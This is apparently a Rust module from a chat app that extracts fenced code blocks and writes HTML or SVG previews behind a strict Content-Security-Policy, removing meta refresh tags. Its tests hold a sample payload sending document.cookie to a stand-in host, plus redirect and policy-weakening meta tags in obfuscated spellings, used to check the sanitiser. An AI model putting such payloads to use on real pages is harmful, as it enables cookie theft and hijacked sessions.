//! Code blocks inside an answer: found, named and saved, so the friendly buttons under a
//! message ("Copy", "Save as file", "Open preview") know what they act on.

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Block {
    pub lang: String,
    pub code: String,
}

impl Block {
    /// Proper file extension for the block's language tag.
    pub fn extension(&self) -> &str {
        match self.lang.to_ascii_lowercase().as_str() {
            "rust" | "rs" => "rs",
            "python" | "py" => "py",
            "javascript" | "js" => "js",
            "typescript" | "ts" => "ts",
            "html" | "htm" => "html",
            "css" => "css",
            "json" => "json",
            "csv" => "csv",
            "svg" => "svg",
            "markdown" | "md" => "md",
            "bash" | "sh" | "shell" => "sh",
            "yaml" | "yml" => "yml",
            "xml" => "xml",
            "sql" => "sql",
            "c" => "c",
            "cpp" | "c++" => "cpp",
            "java" => "java",
            "go" => "go",
            _ => "txt",
        }
    }

    /// Kinds that can be looked at outside the chat (a browser shows them).
    pub fn is_previewable(&self) -> bool {
        matches!(self.extension(), "html" | "svg" | "md")
    }

    /// HTML and SVG can run scripts, so the app asks before opening them.
    pub fn is_active(&self) -> bool {
        matches!(self.extension(), "html" | "svg")
    }

    /// What to write to disk for a preview, as (extension, text). HTML and SVG are always written as
    /// an HTML page that starts with a Content-Security-Policy: no script, no connection, no frame,
    /// no form, no external file of any kind; only inline styles and `data:` pictures. The policy is
    /// the very first thing the browser reads, so nothing of the block's own text comes before it.
    /// Every `<meta http-equiv>` of the block (a `refresh` redirect is not covered by the policy) is removed.
    pub fn preview_file(&self) -> (&'static str, String) {
        match self.extension() {
            "html" => ("html", sandboxed_page(&self.code)),
            "svg" => ("html", sandboxed_page(&self.code)),
            "md" => ("md", self.code.clone()),
            other => (static_ext(other), self.code.clone()),
        }
    }
}

/// The policy used for previews. `'unsafe-inline'` is for styles only; scripts have no source.
pub const PREVIEW_CSP: &str = "default-src 'none'; img-src data:; media-src data:; font-src data:; \
     style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'";

fn static_ext(e: &str) -> &'static str {
    // only used for kinds that are never previewed as pages; the exact text is irrelevant
    match e {
        "rs" => "rs",
        "py" => "py",
        "js" => "js",
        "ts" => "ts",
        "css" => "css",
        "json" => "json",
        "csv" => "csv",
        _ => "txt",
    }
}

fn sandboxed_page(body: &str) -> String {
    format!(
        "<!doctype html><meta http-equiv=\"Content-Security-Policy\" content=\"{PREVIEW_CSP}\">\
         <meta charset=\"utf-8\">{}",
        strip_refresh(body)
    )
}

/// Removes every `<meta ... http-equiv ...>` tag (any case, any spacing, any quoting).
fn strip_refresh(html: &str) -> String {
    let lower = html.to_ascii_lowercase(); // same byte offsets as `html`
    let mut out = String::with_capacity(html.len());
    let mut at = 0;
    while let Some(rel) = lower[at..].find("<meta") {
        let start = at + rel;
        let end = lower[start..]
            .find('>')
            .map_or(html.len(), |e| start + e + 1);
        let tag = &lower[start..end];
        out.push_str(&html[at..start]);
        let squashed: String = tag
            .chars()
            .filter(|c| !c.is_whitespace() && *c != '"' && *c != '\'')
            .collect();
        // every `http-equiv` meta goes (refresh, set-cookie, a weaker policy…): the value can be spelled
        // with character references the policy cannot see through, so it is not read at all
        if !squashed.contains("http-equiv") {
            out.push_str(&html[start..end]);
        }
        at = end;
    }
    out.push_str(&html[at..]);
    out
}

/// Fenced blocks (``` or ~~~, any length ≥ 3) in order; an unclosed block at the end of a
/// half-streamed answer is ignored.
pub fn extract(md: &str) -> Vec<Block> {
    let mut out = Vec::new();
    let mut open: Option<(char, usize, String, Vec<&str>)> = None;
    for line in md.lines() {
        let t = line.trim_start();
        let ch = t.chars().next();
        if let Some(c) = ch.filter(|c| *c == '`' || *c == '~') {
            let n = t.chars().take_while(|x| *x == c).count();
            if n >= 3 {
                match &open {
                    None => {
                        let lang = t[n..].split_whitespace().next().unwrap_or("").to_string();
                        open = Some((c, n, lang, Vec::new()));
                        continue;
                    }
                    Some((oc, on, _, _)) if *oc == c && n >= *on && t[n..].trim().is_empty() => {
                        let (_, _, lang, lines) = open.take().unwrap();
                        out.push(Block {
                            lang,
                            code: lines.join("\n"),
                        });
                        continue;
                    }
                    _ => {}
                }
            }
        }
        if let Some((_, _, _, lines)) = open.as_mut() {
            lines.push(line);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_blocks_and_ignores_the_unclosed_one() {
        let md = "text\n```rust\nfn a() {}\n```\nmore\n~~~html\n<b>x</b>\n~~~\n```py\nprint(1)";
        let b = extract(md);
        assert_eq!(b.len(), 2);
        assert_eq!(
            (b[0].lang.as_str(), b[0].code.as_str()),
            ("rust", "fn a() {}")
        );
        assert_eq!(b[1].extension(), "html");
        assert!(b[1].is_previewable() && b[1].is_active());
        assert!(!b[0].is_previewable());
    }

    #[test]
    fn a_longer_fence_is_not_closed_by_a_shorter_one() {
        let b = extract("````md\n```rust\nx\n```\n````\n");
        assert_eq!(b.len(), 1);
        assert_eq!(b[0].code, "```rust\nx\n```");
        assert_eq!(b[0].extension(), "md");
    }

    #[test]
    fn a_preview_starts_with_a_policy_that_forbids_scripts_and_connections() {
        let evil = "<script>fetch('http://x/'+document.cookie)</script><img src=http://x/a.png>\
                    <meta http-equiv=\"Refresh\" content=\"0;url=http://x\"><p>ok</p>";
        for lang in ["html", "svg"] {
            let b = Block {
                lang: lang.into(),
                code: evil.into(),
            };
            let (ext, page) = b.preview_file();
            assert_eq!(
                ext, "html",
                "{lang}: an SVG is shown inside a page, where the policy applies"
            );
            assert!(
                page.starts_with("<!doctype html><meta http-equiv=\"Content-Security-Policy\"")
            );
            let csp_at = page.find("Content-Security-Policy").unwrap();
            assert!(
                csp_at < page.find("<script").unwrap(),
                "the policy comes before the block's text"
            );
            assert!(page.contains("default-src 'none'"));
            assert!(!page.contains("script-src") && !page.contains("connect-src *"));
            assert!(!page.to_ascii_lowercase().contains("refresh"), "{page}");
            assert!(page.contains("<p>ok</p>"));
        }
    }

    #[test]
    fn refresh_tags_are_removed_in_any_spelling_and_other_meta_tags_stay() {
        for tag in [
            "<meta http-equiv=refresh content=0;url=x>",
            "<META   HTTP-EQUIV = 'refresh'  content='1'>",
            "<meta\nhttp-equiv=\"REFRESH\"\ncontent=\"1\">",
            "<meta http-equiv=&#114;efresh content=1>",
            "<meta http-equiv=Content-Security-Policy content=\"script-src *\">",
        ] {
            let out = strip_refresh(&format!("a{tag}b<meta charset=utf-8>c"));
            assert_eq!(out, "ab<meta charset=utf-8>c", "{tag:?}");
        }
        assert_eq!(strip_refresh("é<meta http-equiv=refresh"), "é");
    }

    #[test]
    fn other_kinds_are_written_as_they_are() {
        let b = Block {
            lang: "md".into(),
            code: "# t".into(),
        };
        assert_eq!(b.preview_file(), ("md", "# t".to_string()));
    }
}
